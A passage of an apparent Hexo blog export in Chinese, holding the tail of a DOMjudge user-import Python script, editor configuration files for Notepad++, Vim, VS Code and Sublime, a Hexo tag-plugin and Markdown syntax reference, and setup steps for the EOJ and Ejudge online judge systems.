+ team_id))</span><br><span class="line">    user.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_userrole</span>(<span class="params">user_id, Users</span>):</span></span><br><span class="line">    userrole = open(<span class="string">&#x27;import_userrole.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(Users)):</span><br><span class="line">        userrole.writelines(<span class="string">&#x27;&quot;%d&quot;,&quot;3&quot;\n&#x27;</span> % (user_id + i))</span><br><span class="line">    userrole.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    User_id = <span class="number">3</span> <span class="comment"># 视情况而定，默认id为1,2的分别是admin,judgehost,所以这里从3开始</span></span><br><span class="line">    Team_id = <span class="number">1</span> <span class="comment"># 视情况而定，默认初始为 1</span></span><br><span class="line">    User = open(<span class="string">&#x27;user.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    User = User.readlines()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(User)):</span><br><span class="line">        User[j] = User[j].strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    import_team(Team_id, User)</span><br><span class="line">    import_user(User_id, Team_id, User)</span><br><span class="line">    import_userrole(User_id, User)</span><br><span class="line">    print(User)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Domjudge</tag>
      </tags>
  </entry>
  <entry>
    <title>配置文件</title>
    <url>/post/da99de06/</url>
    <content><![CDATA[<h1 id="Notepad"><a href="#Notepad" class="headerlink" title="Notepad++"></a>Notepad++</h1><figure class="highlight bat"><figcaption><span><code>编译</code></span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="built_in">cmd</span> /k g++ -o $(CURRENT_DIRECTORY)\$(NAME_PART).exe &quot;$(FULL_CURRENT_PATH)&quot; &amp; <span class="built_in">PAUSE</span> &amp; <span class="keyword">EXIT</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bat"><figcaption><span><code>运行</code></span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="built_in">cmd</span> /k &quot;$(CURRENT_DIRECTORY)\$(NAME_PART)&quot; &amp; <span class="built_in">PAUSE</span> &amp; <span class="keyword">EXIT</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bat"><figcaption><span><code>编译并运行</code></span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="built_in">cmd</span> /k g++ -o $(CURRENT_DIRECTORY)\$(NAME_PART).exe &quot;$(FULL_CURRENT_PATH)&quot; &amp;<span class="built_in">cmd</span> /k &quot;$(CURRENT_DIRECTORY)\$(NAME_PART)&quot; &amp; <span class="built_in">PAUSE</span> &amp; <span class="keyword">EXIT</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="vimrc"><a href="#vimrc" class="headerlink" title=".vimrc"></a>.vimrc</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set number</span><br><span class="line">set nocompatible</span><br><span class="line">syntax on</span><br><span class="line">set showmode</span><br><span class="line">set showcmd</span><br><span class="line">set mouse&#x3D;a</span><br><span class="line">set encoding&#x3D;utf-8</span><br><span class="line">set t_Co&#x3D;256</span><br><span class="line">filetype indent on</span><br><span class="line">set autoindent</span><br><span class="line">set tabstop&#x3D;4</span><br><span class="line">set shiftwidth&#x3D;4</span><br><span class="line">set cursorline</span><br><span class="line">set nowrap</span><br><span class="line">set laststatus&#x3D;2</span><br><span class="line">set ruler</span><br><span class="line">set showmatch</span><br><span class="line">set hlsearch</span><br><span class="line">set ignorecase</span><br><span class="line">set smartcase</span><br><span class="line">set nobackup</span><br><span class="line">set noswapfile</span><br><span class="line">set noerrorbells</span><br><span class="line">set visualbell</span><br><span class="line">set history&#x3D;1000</span><br><span class="line">set autoread</span><br><span class="line">set listchars&#x3D;tab:»■,trail:■</span><br><span class="line">set wildmenu</span><br><span class="line">set wildmode&#x3D;longest:list,full</span><br></pre></td></tr></table></figure>
<h1 id="VS-code"><a href="#VS-code" class="headerlink" title="VS code"></a>VS code</h1><p><code>launch.json</code><br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;configurations&quot;</span>: [</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;(gdb) Launch&quot;</span>, <span class="comment">// 配置名称，将会在启动配置的下拉菜单中显示</span></span><br><span class="line">			<span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cppdbg&quot;</span>,	   <span class="comment">// 配置类型，这里只能为cppdbg</span></span><br><span class="line">			<span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,	<span class="comment">// 请求配置类型，可以为launch（启动）或attach（附加）</span></span><br><span class="line">			<span class="attr">&quot;program&quot;</span>: <span class="string">&quot;$&#123;workspaceRoot&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>,<span class="comment">// 将要进行调试的程序的路径</span></span><br><span class="line">			<span class="attr">&quot;args&quot;</span>: [],			 <span class="comment">// 程序调试时传递给程序的命令行参数，一般设为空即可</span></span><br><span class="line">			<span class="attr">&quot;stopAtEntry&quot;</span>: <span class="literal">false</span>,   <span class="comment">// 设为true时程序将暂停在程序入口处，一般设置为false</span></span><br><span class="line">			<span class="attr">&quot;cwd&quot;</span>: <span class="string">&quot;$&#123;workspaceRoot&#125;&quot;</span>, <span class="comment">// 调试程序时的工作目录，一般为$&#123;workspaceRoot&#125;即代码所在目录</span></span><br><span class="line">			<span class="attr">&quot;environment&quot;</span>: [],</span><br><span class="line">			<span class="attr">&quot;externalConsole&quot;</span>: <span class="literal">true</span>, <span class="comment">// 调试时是否显示控制台窗口，一般设置为true显示控制台</span></span><br><span class="line">			<span class="attr">&quot;MIMode&quot;</span>: <span class="string">&quot;gdb&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;miDebuggerPath&quot;</span>: <span class="string">&quot;E:\\MinGW\\bin\\gdb.exe&quot;</span>, <span class="comment">// miDebugger的路径，注意这里要与MinGw的路径对应</span></span><br><span class="line">			<span class="attr">&quot;preLaunchTask&quot;</span>: <span class="string">&quot;g++&quot;</span>, <span class="comment">// 调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc</span></span><br><span class="line">			<span class="attr">&quot;setupCommands&quot;</span>:</span><br><span class="line">			[</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Enable pretty-printing for gdb&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;text&quot;</span>: <span class="string">&quot;-enable-pretty-printing&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;ignoreFailures&quot;</span>: <span class="literal">true</span></span><br><span class="line">				&#125;</span><br><span class="line">			]</span><br><span class="line">		&#125;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>tasks.json</code><br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;version&quot;</span>: <span class="string">&quot;2.0.0&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;command&quot;</span>: <span class="string">&quot;g++&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;args&quot;</span>: [<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;$&#123;file&#125;&quot;</span>,<span class="string">&quot;-o&quot;</span>,<span class="string">&quot;$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>],	<span class="comment">// 编译命令参数</span></span><br><span class="line">	<span class="attr">&quot;problemMatcher&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;owner&quot;</span>: <span class="string">&quot;cpp&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;fileLocation&quot;</span>: [<span class="string">&quot;relative&quot;</span>, <span class="string">&quot;$&#123;workspaceRoot&#125;&quot;</span>],</span><br><span class="line">		<span class="attr">&quot;pattern&quot;</span>: &#123;</span><br><span class="line">			<span class="attr">&quot;regexp&quot;</span>: <span class="string">&quot;^(.*):(\\d+):(\\d+):\\s+(warning|error):\\s+(.*)$&quot;</span>,</span><br><span class="line">			<span class="attr">&quot;file&quot;</span>: <span class="number">1</span>,</span><br><span class="line">			<span class="attr">&quot;line&quot;</span>: <span class="number">2</span>,</span><br><span class="line">			<span class="attr">&quot;column&quot;</span>: <span class="number">3</span>,</span><br><span class="line">			<span class="attr">&quot;severity&quot;</span>: <span class="number">4</span>,</span><br><span class="line">			<span class="attr">&quot;message&quot;</span>: <span class="number">5</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="Sublime"><a href="#Sublime" class="headerlink" title="Sublime"></a>Sublime</h1><figure class="highlight json"><figcaption><span><code>G++.sublime-build</code></span></figcaption><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    <span class="attr">&quot;cmd&quot;</span>: [<span class="string">&quot;g++&quot;</span>, <span class="string">&quot;$&#123;file&#125;&quot;</span>, <span class="string">&quot;-std=c++11&quot;</span>, <span class="string">&quot;-o&quot;</span>, <span class="string">&quot;$&#123;file_path&#125;\\\\$&#123;file_base_name&#125;&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;$&#123;file_path&#125;\\\\$&#123;file_base_name&#125; &amp; echo. &amp; pause&quot;</span>],</span><br><span class="line">    <span class="attr">&quot;file_regex&quot;</span>: <span class="string">&quot;^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$&quot;</span>, <span class="attr">&quot;working_dir&quot;</span>: <span class="string">&quot;$&#123;file_path&#125;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;selector&quot;</span>: <span class="string">&quot;source.c, source.c++&quot;</span>, <span class="attr">&quot;shell&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;encoding&quot;</span>:<span class="string">&quot;cp936&quot;</span>, </span><br><span class="line">    <span class="attr">&quot;variants&quot;</span>:</span><br><span class="line">    [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;Build Only&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cmd&quot;</span>:[<span class="string">&quot;g++&quot;</span>, <span class="string">&quot;$&#123;file&#125;&quot;</span>, <span class="string">&quot;-std=c++11&quot;</span>, <span class="string">&quot;-o&quot;</span>, <span class="string">&quot;$&#123;file_path&#125;\\\\$&#123;file_base_name&#125;&quot;</span>]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;Run Only&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cmd&quot;</span> : [<span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;$&#123;file_path&#125;\\\\$&#123;file_base_name&#125; &amp; echo. &amp; pause&quot;</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>资料</category>
      </categories>
      <tags>
        <tag>Notepad</tag>
        <tag>VIM</tag>
        <tag>VScode</tag>
        <tag>Sublime</tag>
      </tags>
  </entry>
  <entry>
    <title>文档 | HEXO</title>
    <url>/post/ffbd0586/</url>
    <content><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>标签插件和 <code>Front-matter</code> 中的标签不同，它们是用于在文章中快速插入特定内容的插件。<br><a id="more"></a></p>
<h2 id="引用块"><a href="#引用块" class="headerlink" title="引用块"></a>引用块</h2><p>在文章中插入引言，可包含作者、来源和标题。<br><strong>别号：</strong> quote</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% blockquote [author[, source]] [link] [source_link_title] %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h3><p><strong>没有提供参数，则只输出普通的 blockquote</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% blockquote %&#125;</span><br><span class="line">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>
<blockquote><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.</p>
</blockquote>
<p><strong>引用书上的句子</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% blockquote David Levithan, Wide Awake %&#125;</span><br><span class="line">Do not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>
<blockquote><p>Do not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.</p>
<footer><strong>David Levithan</strong><cite>Wide Awake</cite></footer></blockquote>
<p><strong>引用 Twitter</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% blockquote @DevDocs https:&#x2F;&#x2F;twitter.com&#x2F;devdocs&#x2F;status&#x2F;356095192085962752 %&#125;</span><br><span class="line">NEW: DevDocs now comes with syntax highlighting. http:&#x2F;&#x2F;devdocs.io</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>
<blockquote><p>NEW: DevDocs now comes with syntax highlighting. <a href="http://devdocs.io">http://devdocs.io</a></p>
<footer><strong>@DevDocs</strong><cite><a href="https://twitter.com/devdocs/status/356095192085962752">twitter.com/devdocs/status/356095192085962752</a></cite></footer></blockquote>
<p><strong>引用网络上的文章</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% blockquote Seth Godin http:&#x2F;&#x2F;sethgodin.typepad.com&#x2F;seths_blog&#x2F;2009&#x2F;07&#x2F;welcome-to-island-marketing.html Welcome to Island Marketing %&#125;</span><br><span class="line">Every interaction is both precious and an opportunity to delight.</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>
<blockquote><p>Every interaction is both precious and an opportunity to delight.</p>
<footer><strong>Seth Godin</strong><cite><a href="http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html">Welcome to Island Marketing</a></cite></footer></blockquote>
<h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>在文章中插入代码。</p>
<p><strong>别名：</strong> code</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% codeblock [title] [lang:language] [url] [link text] %&#125;</span><br><span class="line">code snippet</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="样例-1"><a href="#样例-1" class="headerlink" title="样例"></a>样例</h3><p><strong>普通的代码块</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% codeblock %&#125;</span><br><span class="line">alert(&#39;Hello World!&#39;);</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert(&#39;Hello World!&#39;);</span><br></pre></td></tr></table></figure>
<p><strong>指定语言</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% codeblock lang:objc %&#125;</span><br><span class="line">[rectangle setX: 10 y: 10 width: 20 height: 20];</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight objc"><table><tr><td class="code"><pre><span class="line">[rectangle setX: <span class="number">10</span> y: <span class="number">10</span> width: <span class="number">20</span> height: <span class="number">20</span>];</span><br></pre></td></tr></table></figure>
<p><strong>附加说明</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% codeblock Array.map %&#125;</span><br><span class="line">array.map(callback[, thisArg])</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><figcaption><span>Array.map</span></figcaption><table><tr><td class="code"><pre><span class="line">array.map(callback[, thisArg])</span><br></pre></td></tr></table></figure>
<p><strong>附加说明和网址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% codeblock _.compact http:&#x2F;&#x2F;underscorejs.org&#x2F;#compact Underscore.js %&#125;</span><br><span class="line">_.compact([0, 1, false, 2, &#39;&#39;, 3]);</span><br><span class="line">&#x3D;&gt; [1, 2, 3]</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><figcaption><span>_.compact</span><a href="http://underscorejs.org/#compact">Underscore.js</a></figcaption><table><tr><td class="code"><pre><span class="line">_.compact([0, 1, false, 2, &#39;&#39;, 3]);</span><br><span class="line">&#x3D;&gt; [1, 2, 3]</span><br></pre></td></tr></table></figure>
<h2 id="反引号代码块"><a href="#反引号代码块" class="headerlink" title="反引号代码块"></a>反引号代码块</h2><p>另一种形式的代码块，不同的是它使用三个反引号来包裹。</p>

&#96`` [language] [title] [url] [link text]
code snippet
&#96;``

<h2 id="Pull-Quote"><a href="#Pull-Quote" class="headerlink" title="Pull Quote"></a>Pull Quote</h2><p>在文章中插入 Pull quote。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% pullquote [class] %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endpullquote %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="jsFiddle"><a href="#jsFiddle" class="headerlink" title="jsFiddle"></a>jsFiddle</h2><p>在文章中嵌入 jsFiddle。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% jsfiddle shorttag [tabs] [skin] [width] [height] %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Gist"><a href="#Gist" class="headerlink" title="Gist"></a>Gist</h2><p>在文章中嵌入 Gist。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% gist gist_id [filename] %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><p>在文章中插入 iframe。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% iframe url [width] [height] %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h2><p>在文章中插入指定大小的图片。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% img [class names] &#x2F;path&#x2F;to&#x2F;image [width] [height] [title text [alt text]] %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h2><p>在文章中插入链接，并自动给外部链接添加 <code>target=&quot;_blank&quot;</code> 属性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% link text url [external] [title] %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Include-Code"><a href="#Include-Code" class="headerlink" title="Include Code"></a>Include Code</h2><p>插入 <code>source</code> 文件夹内的代码文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% include_code [title] [lang:language] path&#x2F;to&#x2F;file %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Youtube"><a href="#Youtube" class="headerlink" title="Youtube"></a>Youtube</h2><p>在文章中插入 Youtube 视频。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% youtube video_id %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Vimeo"><a href="#Vimeo" class="headerlink" title="Vimeo"></a>Vimeo</h2><p>在文章中插入 Vimeo 视频。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% vimeo video_id %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="引用文章"><a href="#引用文章" class="headerlink" title="引用文章"></a>引用文章</h2><p>引用其他文章的链接。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% post_path slug %&#125;</span><br><span class="line">&#123;% post_link slug [title] %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="引用资源"><a href="#引用资源" class="headerlink" title="引用资源"></a>引用资源</h2><p>引用文章的资源。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_path slug %&#125;</span><br><span class="line">&#123;% asset_img slug [title] %&#125;</span><br><span class="line">&#123;% asset_link slug [title] %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Raw"><a href="#Raw" class="headerlink" title="Raw"></a>Raw</h2><p>如果您想在文章中插入 Swig 标签，可以尝试使用 Raw 标签，以免发生解析异常。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% raw %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 这是一级标题</span><br><span class="line">## 这是二级标题</span><br><span class="line">### 这是三级标题</span><br><span class="line">#### 这是四级标题</span><br><span class="line">##### 这是五级标题</span><br><span class="line">###### 这是六级标题</span><br></pre></td></tr></table></figure>
<h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*这是倾斜的文字*</span><br><span class="line">**这是加粗的文字**</span><br><span class="line">***这是斜体加粗的文字***</span><br><span class="line">~~这是加删除线的文字~~</span><br></pre></td></tr></table></figure>
<h2 id="引用-1"><a href="#引用-1" class="headerlink" title="引用"></a>引用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;这是引用的内容</span><br><span class="line">&gt;&gt;这是引用的内容</span><br><span class="line">&gt;&gt;&gt;这是引用的内容</span><br><span class="line">&gt;&gt;&gt;&gt;这是引用的内容</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">----</span><br><span class="line">***</span><br><span class="line">*****</span><br><span class="line">然而没什么卵用，效果都一样。</span><br></pre></td></tr></table></figure>
<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>语法：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![图片ALT](图片URL &quot;图片title&quot;)</span><br><span class="line">图片alt就是显示在图片下面的文字，相当于对图片内容的解释。</span><br><span class="line">图片title是图片的标题，当鼠标移到图片上时显示的内容,可不填。</span><br></pre></td></tr></table></figure><br>效果：<br><img data-src="https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80" alt="示例图片" title="亦往沧劫"></p>
<h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[显示名称](超链接URL &quot;超链接title&quot;)</span><br><span class="line">title可不加。</span><br></pre></td></tr></table></figure>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>示例:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 无序列表</span><br><span class="line">   1.有序列表</span><br><span class="line">   2.有序列表</span><br><span class="line">- 无序列表</span><br><span class="line">   1.有序列表</span><br><span class="line">   2.有序列表</span><br></pre></td></tr></table></figure><br>效果:</p>
<ul>
<li>无序列表<br> 1.有序列表<br> 2.有序列表</li>
<li>无序列表<br> 1.有序列表<br> 2.有序列表</li>
</ul>
<h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>示例:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表头|表头|表头</span><br><span class="line">---|:--:|---:</span><br><span class="line">内容|内容|内容</span><br><span class="line">内容|内容|内容</span><br><span class="line"></span><br><span class="line">第二行分割表头和内容。</span><br><span class="line">- 有一个就行，为了对齐，多加了几个</span><br><span class="line">文字默认居左</span><br><span class="line">-两边加：表示文字居中</span><br><span class="line">-右边加：表示文字居右</span><br><span class="line">注：原生的语法两边都要用 | 包起来。此处省略!</span><br></pre></td></tr></table></figure><br>效果:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>表头</th>
<th style="text-align:center">表头</th>
<th style="text-align:right">表头</th>
</tr>
</thead>
<tbody>
<tr>
<td>内容</td>
<td style="text-align:center">内容</td>
<td style="text-align:right">内容</td>
</tr>
<tr>
<td>内容</td>
<td style="text-align:center">内容</td>
<td style="text-align:right">内容</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>Web</category>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>EOJ 搭建教程</title>
    <url>/post/f29422fd/</url>
    <content><![CDATA[<h1 id="EOJ"><a href="#EOJ" class="headerlink" title="EOJ"></a>EOJ</h1><h2 id="克隆EOJ"><a href="#克隆EOJ" class="headerlink" title="克隆EOJ"></a>克隆EOJ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ultmaster/eoj3.git</span><br><span class="line"><span class="built_in">cd</span> eoj3</span><br></pre></td></tr></table></figure>
<p>然后执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh install.sh</span><br></pre></td></tr></table></figure></p>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>
<p>如果出现以下情况<br><code>Command &quot;python setup.py egg_info&quot; failed with error code 1 in /tmp/pip-build-twvou5gt/msqlclient/</code><br>执行以下命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libmysqld-dev</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
<h2 id="安装npm"><a href="#安装npm" class="headerlink" title="安装npm"></a>安装npm</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install npm</span><br><span class="line"><span class="built_in">cd</span> static</span><br><span class="line">npm install</span><br><span class="line"><span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure>
<h2 id="创建超级用户"><a href="#创建超级用户" class="headerlink" title="创建超级用户"></a>创建超级用户</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install django</span><br><span class="line">python3 manage.py createsuperuser</span><br></pre></td></tr></table></figure>
<h2 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 manage.py collectstatic</span><br><span class="line">python3 manage.py makemigrations</span><br><span class="line">python3 manage.py migrate</span><br></pre></td></tr></table></figure>
<h2 id="运行前端"><a href="#运行前端" class="headerlink" title="运行前端"></a>运行前端</h2><p>运行前先安装一下<code>redis-server</code>。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install redis-server</span><br></pre></td></tr></table></figure><br>此时，可以运行server了。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 manage.py runserver 0.0.0.0:80</span><br></pre></td></tr></table></figure><br>此时访问前端，发现页面布局有问题，是因为缺少一个 css 文件，执行下面命令即可。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate -P ./static/css https://acm.ecnu.edu.cn/static/css/app.min.css</span><br></pre></td></tr></table></figure></p>
<h1 id="Ejudge"><a href="#Ejudge" class="headerlink" title="Ejudge"></a>Ejudge</h1><h2 id="克隆Ejudge"><a href="#克隆Ejudge" class="headerlink" title="克隆Ejudge"></a>克隆Ejudge</h2><p>随便找个目录，进行以下操作。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ultmaster/ejudge.git</span><br></pre></td></tr></table></figure></p>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ejudge</span><br><span class="line">sh init.sh</span><br></pre></td></tr></table></figure>
<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y docker.io</span><br><span class="line">sudo apt-get install systemctl</span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>
